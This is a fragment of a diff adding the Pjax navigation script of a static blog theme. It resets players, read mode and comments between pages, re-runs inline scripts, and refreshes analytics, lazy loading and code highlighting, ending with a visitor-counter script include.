pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener
+  btf.removeGlobalFnEvent('pjax')
+  btf.removeGlobalFnEvent('themeChange')
+
+  document.getElementById('rightside').classList.remove('rightside-show')
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
